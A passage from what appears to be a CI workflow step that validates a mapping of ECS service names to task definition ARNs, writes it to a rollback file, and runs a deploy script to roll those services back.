            || { echo "::error::previous_task_definitions must map service names to task definition ARNs"; exit 1; }
          echo "$PREVIOUS" > rollback.json
          services=$(jq -r 'keys | join(",")' rollback.json)
          bash learnix-infra/scripts/ecs-deploy.sh --cluster "$ECS_CLUSTER" --services "$services" --rollback --to-file rollback.json
